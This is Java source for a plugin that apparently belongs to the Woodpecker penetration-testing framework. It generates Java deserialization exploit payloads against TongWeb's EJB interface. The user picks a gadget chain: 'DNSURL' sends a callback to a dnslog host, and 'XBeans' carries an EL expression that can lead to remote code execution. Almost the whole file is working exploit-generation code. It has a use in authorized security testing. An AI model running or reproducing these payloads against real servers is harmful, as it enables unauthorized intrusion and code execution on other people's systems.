package me.gv7.woodpecker.expliot;

import me.gv7.woodpecker.gadget.DNSURL;
import me.gv7.woodpecker.gadget.XBeans;
import me.gv7.woodpecker.plugin.*;

import java.util.Arrays;
import java.util.Map;

public class TongwebAttack implements IPayloadGenerator {
    private IPluginHelper helper = TongwebPlugin.pluginHelper;
    @Override
    public String getPayloadTabCaption() {
        return "TongWeb Ejb 反序列化";
    }

    @Override
    public IArgsUsageBinder getPayloadCustomArgs() {
        IArg version = this.helper.createArg();
        version.setName("version");
        version.setRequired(true);
        version.setDefaultValue("1");
        version.setDescription("版本: old:1  new:2");

        IArg gadget = this.helper.createArg();
        gadget.setName("gadget");
        gadget.setRequired(true);
        gadget.setDefaultValue("DNSURL");
        gadget.setDescription("DNSURL,XBeans");

        IArg param = this.helper.createArg();
        param.setName("param");
        param.setRequired(true);
        param.setDefaultValue("xxxx.dnslog.com");
        param.setDescription("参数，el表达式");

        IArgsUsageBinder usageBinder = this.helper.createArgsUsageBinder();
        usageBinder.setArgsList(Arrays.asList(new IArg[] { version, gadget,param}));
        return usageBinder;
    }

    @Override
    public void generatorPayload(Map<String, Object> map, IResultOutput iResultOutput) throws Throwable {
        String version = (String)map.get("version");
        String gadget = (String)map.get("gadget");
        String param = (String)map.get("param");
        switch (gadget){
            case "DNSURL":
                if(!param.isEmpty()){
                    DNSURL payload = new DNSURL();
                    iResultOutput.infoPrintln("gadget : " + gadget +"======== payload ======== : \n");
                    iResultOutput.infoPrintln("url: http://"+param+"\n");
                    iResultOutput.infoPrintln(payload.getPayload(version,payload.getObject(param)));
                }else {
                    iResultOutput.errorPrintln("请输入dnslog地址");
                }
                break;
            case "XBeans":
                if(!param.isEmpty()){
                    XBeans xBeans = new XBeans();
                    iResultOutput.infoPrintln("gadget : " + gadget +"======== payload ======== : \n");
                    iResultOutput.infoPrintln(xBeans.getPayload(version,xBeans.getObject(param)));
                }else {
                    iResultOutput.errorPrintln("请输入el表达式");
                }
                break;
            default:
                iResultOutput.infoPrintln("请选择利用链");
                break;
        }


    }

}
